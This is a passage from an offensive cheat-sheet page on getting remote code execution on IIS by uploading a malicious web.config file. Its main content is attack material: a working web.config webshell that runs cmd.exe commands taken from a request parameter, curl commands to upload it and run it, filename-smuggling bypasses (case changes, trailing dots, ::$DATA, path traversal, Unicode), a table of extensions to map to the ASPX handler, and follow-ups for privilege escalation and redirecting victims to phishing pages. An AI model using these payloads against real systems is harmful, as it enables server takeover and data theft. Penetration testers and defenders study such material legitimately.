  :::card
  ---
  icon: i-lucide-book-open
  title: Original Research
  to: https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/
  target: _blank
  ---
  Soroush Dalili's seminal blog post on web.config upload abuse. Covers the original technique for executing ASPX code through uploaded web.config files on IIS.
  :::

  :::card
  ---
  icon: i-lucide-scroll-text
  title: IIS Handler Mapping Docs
  to: https://learn.microsoft.com/en-us/iis/configuration/system.webServer/handlers/
  target: _blank
  ---
  Microsoft's official documentation on IIS handler mappings. Reference for understanding `system.webServer/handlers` configuration and `preCondition` attributes.
  :::

  :::card
  ---
  icon: i-lucide-shield-alert
  title: OWASP Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP reference on unrestricted file upload vulnerabilities including web.config as a dangerous file type.
  :::

  :::card
  ---
  icon: i-lucide-flask-conical
  title: PayloadsAllTheThings — Upload
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained payload repository with web.config samples, handler mapping configs, and alternative exploitation payloads.
  :::

  :::card
  ---
  icon: i-lucide-lock
  title: IIS Request Filtering
  to: https://learn.microsoft.com/en-us/iis/configuration/system.webServer/security/requestFiltering/
  target: _blank
  ---
  Understanding how IIS request filtering blocks `.config` access by default and how the `hiddenSegments` and `fileExtensions` rules work.
  :::

  :::card
  ---
  icon: i-lucide-settings-2
  title: Configuration Section Locking
  to: https://learn.microsoft.com/en-us/iis/get-started/planning-for-security/how-to-use-locking-in-iis-configuration
  target: _blank
  ---
  Microsoft documentation on `allowOverride`, `lockAllElementsExcept`, and `lockElements` — critical for understanding which sections can be overridden in subdirectory web.config files.
  :::
::

---

## Cheat Sheet

::card-group
  :::card
  ---
  icon: i-lucide-zap
  title: Fastest PoC
  ---
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="w" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified" requireAccess="Write"
          preCondition="bitness64"/>
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config"/>
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config"/>
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" %>
  <%Response.Write(new System.Diagnostics
  .Process(){StartInfo=new System.Diagnostics
  .ProcessStartInfo("cmd.exe","/c "+Request
  ["cmd"]){RedirectStandardOutput=true,
  UseShellExecute=false}}.Start()
  .StandardOutput.ReadToEnd());%>
  ```
  :::

  :::card
  ---
  icon: i-lucide-list-ordered
  title: Attack Priority
  ---
  1. Upload `web.config` with inline ASPX code + self-handler
  2. If blocked → Upload `web.config` handler + `shell.jpg` separately
  3. If `web.config` name blocked → Case variation (`Web.Config`)
  4. If case blocked → Unicode normalization (`ｗｅｂ.config`)
  5. If extension blocked → Trailing dot (`web.config.`)
  6. If content filtered → Path traversal into upload dir
  7. If handlers locked → Try `httpProtocol` for header injection
  8. If all sections locked → Try `directoryBrowse` or `staticContent`
  9. If nothing works → WebDAV PUT method
  10. Last resort → Combine with other upload bypass techniques
  :::

  :::card
  ---
  icon: i-lucide-terminal
  title: Quick Commands
  ---
  ```bash
  # Upload web.config
  curl -X POST URL/upload -F "file=@web.config"

  # Test execution
  curl "URL/uploads/web.config?cmd=whoami"

  # Two-stage: handler + shell
  curl -X POST URL/upload -F "file=@web.config"
  curl -X POST URL/upload -F "file=@shell.jpg"
  curl "URL/uploads/shell.jpg?cmd=whoami"

  # WebDAV upload
  curl -X PUT "URL/uploads/web.config" -d @web.config

  # Confirm IIS
  curl -sI URL | grep -i server

  # Check config applied
  curl -sI "URL/uploads/" | grep -i x-test
  ```
  :::

  :::card
  ---
  icon: i-lucide-file-code
  title: Handler Type Quick Reference
  ---
  ```
  INTEGRATED MODE:
  type="System.Web.UI.PageHandlerFactory"
  preCondition="integratedMode"

  CLASSIC MODE (64-bit .NET 4.x):
  modules="IsapiModule"
  scriptProcessor="%windir%\Microsoft.NET\
    Framework64\v4.0.30319\aspnet_isapi.dll"
  preCondition="bitness64"

  CLASSIC MODE (32-bit .NET 4.x):
  modules="IsapiModule"
  scriptProcessor="%windir%\Microsoft.NET\
    Framework\v4.0.30319\aspnet_isapi.dll"
  preCondition="bitness32"

  CLASSIC MODE (64-bit .NET 2.0):
  scriptProcessor="%windir%\Microsoft.NET\
    Framework64\v2.0.50727\aspnet_isapi.dll"
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-off
  title: Required Security Removal
  ---
  ```xml
  <!-- ALWAYS include these to allow
       .config access via browser -->
  <security>
    <requestFiltering>
      <!-- Allow .config extension -->
      <fileExtensions>
        <remove fileExtension=".config"/>
      </fileExtensions>
      <!-- Remove web.config from hidden -->
      <hiddenSegments>
        <remove segment="web.config"/>
      </hiddenSegments>
    </requestFiltering>
  </security>

  <!-- Without both removes, IIS returns
       404.8 (hidden segment) or
       404.7 (blocked extension) -->
  ```
  :::

  :::card
  ---
  icon: i-lucide-monitor-check
  title: Verification Checklist
  ---
  - `curl -sI URL | grep Server:` → Must show `Microsoft-IIS`
  - Upload `web.config` → HTTP 200/201
  - Access `URL/uploads/web.config` → Not 404
  - See ASPX output, not XML source → Handler is active
  - `?cmd=whoami` returns username → RCE confirmed
  - Check AppPool identity → Determine privilege level
  - `whoami /priv` → Check for `SeImpersonate` (potato attacks)
  :::
::

---

## Extension Mapping Cheat Sheet

::collapsible

| Extension to Map | Handler Type | Use Case |
| --- | --- | --- |
| `*.jpg` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code disguised as images |
| `*.png` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code disguised as images |
| `*.gif` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code disguised as images |
| `*.txt` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in text files |
| `*.log` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in log files |
| `*.pdf` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in PDF-named files |
| `*.doc` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in doc-named files |
| `*.xml` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in XML files |
| `*.json` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in JSON-named files |
| `*.css` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in CSS-named files |
| `*.js` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in JS-named files |
| `*.html` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in HTML files |
| `*.htm` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in HTM files |
| `*.config` | `System.Web.UI.PageHandlerFactory` | Execute ASPX code in config files |
| `*.*` | `System.Web.UI.PageHandlerFactory` | Execute ANY file as ASPX (broad) |

::

---

## Common Troubleshooting Flows

::steps{level="4"}
#### Upload Succeeds but No Execution

```bash
# Check if web.config is in the same directory as shell file
curl -sI "https://target.com/uploads/web.config"
curl -sI "https://target.com/uploads/shell.jpg"

# If web.config returns 404.7 or 404.8:
# → requestFiltering section may be locked
# → Try integrated mode handler type instead of ISAPI module

# If shell.jpg returns raw ASPX source code:
# → Handler mapping not applied
# → web.config may be in wrong directory or not being read
```

#### Upload Returns 500 Error

```bash
# Enable detailed errors to see the actual issue
# Upload simplified diagnostic web.config first
cat > diag.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <customErrors mode="Off" />
  </system.web>
  <system.webServer>
    <httpErrors errorMode="Detailed" />
  </system.webServer>
</configuration>
EOF

curl -X POST https://target.com/upload -F "file=@diag.xml;filename=web.config"
curl -s "https://target.com/uploads/"
# Read the detailed error to identify locked sections or syntax issues
```

#### Filename Blocked by Filter

```bash
# Try case variations
curl -X POST URL -F "file=@web.config;filename=Web.Config"
curl -X POST URL -F "file=@web.config;filename=WEB.CONFIG"

# Try trailing characters
curl -X POST URL -F "file=@web.config;filename=web.config."
curl -X POST URL -F "file=@web.config;filename=web.config "
curl -X POST URL -F "file=@web.config;filename=web.config::$DATA"

# Try path traversal
curl -X POST URL -F "file=@web.config;filename=../uploads/web.config"

# Try Unicode
curl -X POST URL -F "file=@web.config;filename=ｗeb.config"
```

#### Handler Section Is Locked

```bash
# Fallback to non-handler techniques:

# 1. Header injection (rarely locked)
# Upload web.config that removes security headers
# Then chain with SVG XSS or other client-side attacks

# 2. Directory browsing (rarely locked)
# Enumerate uploaded files and application structure

# 3. Static content MIME mapping (rarely locked)
# Allow serving of executable file types

# 4. HTTP redirect (rarely locked)
# Redirect victims to phishing pages
```
::